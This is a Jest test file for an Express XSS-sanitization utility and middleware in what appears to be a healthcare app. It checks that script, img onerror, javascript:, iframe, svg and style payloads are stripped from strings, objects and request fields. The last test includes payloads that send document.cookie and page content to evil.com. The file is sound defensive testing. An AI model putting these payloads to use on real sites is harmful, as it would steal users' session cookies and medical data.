// XSS protection and sanitization tests
import { sanitizeString, sanitizeObject, xssClean } from '../server/utils/xssClean';
import { Request, Response, NextFunction } from 'express';

describe('XSS Sanitization', () => {
  describe('sanitizeString', () => {
    test('should remove script tags', () => {
      const maliciousInput = '<script>alert("xss")</script>Hello World';
      const cleaned = sanitizeString(maliciousInput);
      
      expect(cleaned).not.toContain('<script>');
      expect(cleaned).not.toContain('</script>');
      expect(cleaned).toContain('Hello World');
    });

    test('should neutralize img onerror attacks', () => {
      const maliciousInput = '<img src=x onerror=alert("xss")>Safe content';
      const cleaned = sanitizeString(maliciousInput);
      
      expect(cleaned).not.toContain('onerror');
      expect(cleaned).not.toContain('<img');
      expect(cleaned).toContain('Safe content');
    });

    test('should remove javascript protocols', () => {
      const maliciousInput = '<a href="javascript:alert(\'xss\')">Click</a>';
      const cleaned = sanitizeString(maliciousInput);
      
      expect(cleaned).not.toContain('javascript:');
      expect(cleaned).toContain('Click');
    });

    test('should handle nested HTML attacks', () => {
      const maliciousInput = '<div><script>alert("nested")</script><p>Content</p></div>';
      const cleaned = sanitizeString(maliciousInput);
      
      expect(cleaned).not.toContain('<script>');
      expect(cleaned).not.toContain('<div>');
      expect(cleaned).toContain('Content');
    });

    test('should preserve safe text content', () => {
      const safeInput = 'This is normal text with numbers 123 and symbols @#$%';
      const cleaned = sanitizeString(safeInput);
      
      expect(cleaned).toBe(safeInput);
    });
  });

  describe('sanitizeObject', () => {
    test('should sanitize object properties', () => {
      const maliciousObject = {
        name: '<script>alert("xss")</script>John',
        email: 'john@example.com',
        bio: '<img src=x onerror=alert("xss")>Bio text',
        age: 25
      };

      const cleaned = sanitizeObject(maliciousObject);
      
      expect(cleaned.name).not.toContain('<script>');
      expect(cleaned.name).toContain('John');
      expect(cleaned.email).toBe('john@example.com');
      expect(cleaned.bio).not.toContain('<img');
      expect(cleaned.bio).toContain('Bio text');
      expect(cleaned.age).toBe(25);
    });

    test('should handle nested objects', () => {
      const nestedObject = {
        user: {
          profile: {
            name: '<script>alert("nested")</script>Alice',
            description: 'Safe description'
          },
          settings: {
            theme: '<iframe src="javascript:alert(\'xss\')"></iframe>dark'
          }
        },
        metadata: {
          created: '2024-01-01'
        }
      };

      const cleaned = sanitizeObject(nestedObject);
      
      expect(cleaned.user.profile.name).not.toContain('<script>');
      expect(cleaned.user.profile.name).toContain('Alice');
      expect(cleaned.user.profile.description).toBe('Safe description');
      expect(cleaned.user.settings.theme).not.toContain('<iframe');
      expect(cleaned.user.settings.theme).toContain('dark');
      expect(cleaned.metadata.created).toBe('2024-01-01');
    });

    test('should handle arrays in objects', () => {
      const objectWithArray = {
        tags: [
          '<script>alert("tag1")</script>important',
          'normal-tag',
          '<img src=x onerror=alert("tag3")>urgent'
        ],
        title: 'Safe title'
      };

      const cleaned = sanitizeObject(objectWithArray);
      
      expect(cleaned.tags[0]).not.toContain('<script>');
      expect(cleaned.tags[0]).toContain('important');
      expect(cleaned.tags[1]).toBe('normal-tag');
      expect(cleaned.tags[2]).not.toContain('<img');
      expect(cleaned.tags[2]).toContain('urgent');
      expect(cleaned.title).toBe('Safe title');
    });

    test('should handle null and undefined values', () => {
      const objectWithNulls = {
        name: null,
        description: undefined,
        content: '<script>alert("xss")</script>Real content'
      };

      const cleaned = sanitizeObject(objectWithNulls);
      
      expect(cleaned.name).toBeNull();
      expect(cleaned.description).toBeUndefined();
      expect(cleaned.content).not.toContain('<script>');
      expect(cleaned.content).toContain('Real content');
    });
  });

  describe('xssClean middleware', () => {
    let mockReq: Partial<Request>;
    let mockRes: Partial<Response>;
    let mockNext: jest.MockedFunction<NextFunction>;

    beforeEach(() => {
      mockReq = {
        body: {},
        query: {},
        params: {}
      };
      mockRes = {};
      mockNext = jest.fn();
    });

    test('should sanitize request body', () => {
      mockReq.body = {
        name: '<script>alert("xss")</script>Test User',
        comment: '<img src=x onerror=alert("xss")>This is my comment',
        email: 'user@example.com'
      };

      const middleware = xssClean();
      middleware(mockReq as Request, mockRes as Response, mockNext);

      expect(mockReq.body.name).not.toContain('<script>');
      expect(mockReq.body.name).toContain('Test User');
      expect(mockReq.body.comment).not.toContain('<img');
      expect(mockReq.body.comment).toContain('This is my comment');
      expect(mockReq.body.email).toBe('user@example.com');
      expect(mockNext).toHaveBeenCalled();
    });

    test('should sanitize query parameters', () => {
      mockReq.query = {
        search: '<script>alert("search")</script>patient name',
        filter: 'normal filter',
        sort: '<iframe src="javascript:alert()"></iframe>date'
      };

      const middleware = xssClean();
      middleware(mockReq as Request, mockRes as Response, mockNext);

      expect(mockReq.query.search).not.toContain('<script>');
      expect(mockReq.query.search).toContain('patient name');
      expect(mockReq.query.filter).toBe('normal filter');
      expect(mockReq.query.sort).not.toContain('<iframe');
      expect(mockReq.query.sort).toContain('date');
      expect(mockNext).toHaveBeenCalled();
    });

    test('should sanitize URL parameters', () => {
      mockReq.params = {
        id: '123',
        name: '<script>alert("param")</script>john',
        category: 'medical<img src=x onerror=alert("param2")>'
      };

      const middleware = xssClean();
      middleware(mockReq as Request, mockRes as Response, mockNext);

      expect(mockReq.params.id).toBe('123');
      expect(mockReq.params.name).not.toContain('<script>');
      expect(mockReq.params.name).toContain('john');
      expect(mockReq.params.category).not.toContain('<img');
      expect(mockReq.params.category).toContain('medical');
      expect(mockNext).toHaveBeenCalled();
    });

    test('should handle healthcare-specific malicious payloads', () => {
      mockReq.body = {
        patientName: '<script>document.location="http://evil.com/steal?data="+document.cookie</script>John Doe',
        symptoms: '<img src=x onerror=fetch("http://evil.com/log?symptom="+encodeURIComponent(document.body.innerHTML))>Fever',
        medication: '<svg onload=alert("Medical data compromised")>Aspirin',
        notes: '<style>body{background:url("javascript:alert(\'CSS XSS\')")}</style>Patient recovering well'
      };

      const middleware = xssClean();
      middleware(mockReq as Request, mockRes as Response, mockNext);

      expect(mockReq.body.patientName).not.toContain('<script>');
      expect(mockReq.body.patientName).toContain('John Doe');
      expect(mockReq.body.symptoms).not.toContain('<img');
      expect(mockReq.body.symptoms).toContain('Fever');
      expect(mockReq.body.medication).not.toContain('<svg');
      expect(mockReq.body.medication).toContain('Aspirin');
      expect(mockReq.body.notes).not.toContain('<style>');
      expect(mockReq.body.notes).toContain('Patient recovering well');
      expect(mockNext).toHaveBeenCalled();
    });
  });
});